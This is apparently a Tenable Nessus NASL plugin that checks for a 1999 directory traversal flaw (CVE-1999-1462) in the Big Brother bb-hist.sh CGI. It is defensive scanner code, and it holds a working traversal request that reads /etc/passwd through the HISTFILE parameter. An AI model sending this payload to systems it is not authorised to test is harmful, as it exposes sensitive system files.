#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10025);
 script_bugtraq_id(142);
 script_version ("$Revision: 1.32 $");
 script_cve_id("CVE-1999-1462");
 script_xref(name:"OSVDB", value:"21");
 
 script_name(english:"Big Brother bb-hist.sh History Module Directory Traversal");
 script_summary(english:"Read arbitrary files using the CGI bb-hist.sh");

 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "A web application running on the remote host has a directory traversal\n",
     "vulnerability."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The version of Big Brother running on the remote host has a directory\n",
     "traveral vulnerability in the 'HISTFILE' parameter of the 'bb-hist.sh'\n",
     "CGI.  A remote attacker could exploit this to read sensitive\n",
     "information from the system."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/1999_2/0272.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to Big Brother 1.09d or later."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N"
 );
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");
  
 script_copyright("This script is Copyright (C) 1999-2009 Tenable Network Security, Inc."); 

 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);


foreach dir (cgi_dirs())
{
url = string(dir, "/bb-hist.sh?HISTFILE=../../../../../etc/passwd");
res = http_send_recv3(method:"GET", item:url, port:port);
if (isnull(res)) exit(0);

if(egrep(pattern:"root:.*:0:[01]:.*", string:res[2]))
   {
    security_warning(port);
    exit(0);
   }
}
